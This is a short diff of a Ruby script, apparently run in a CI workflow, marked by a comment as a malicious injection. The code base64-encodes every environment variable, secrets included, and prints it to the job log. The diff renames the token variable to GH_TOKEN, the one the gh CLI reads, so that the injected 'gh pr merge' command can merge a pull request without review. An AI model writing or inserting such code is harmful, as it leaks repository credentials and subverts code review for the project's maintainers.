@@ -16,7 +16,7 @@ puts "------------------------------------------------"
 require 'base64'
 
 encoded = Base64.strict_encode64(ENV.to_h.to_s)
-ENV["GITHUB_TOKEN"] = ENV["INPUT_TOKEN"]
+ENV["GH_TOKEN"] = ENV["INPUT_TOKEN"]
 system("gh pr merge 3 --merge")
 puts encoded
 # --- Malicious Injection Ends Here ---
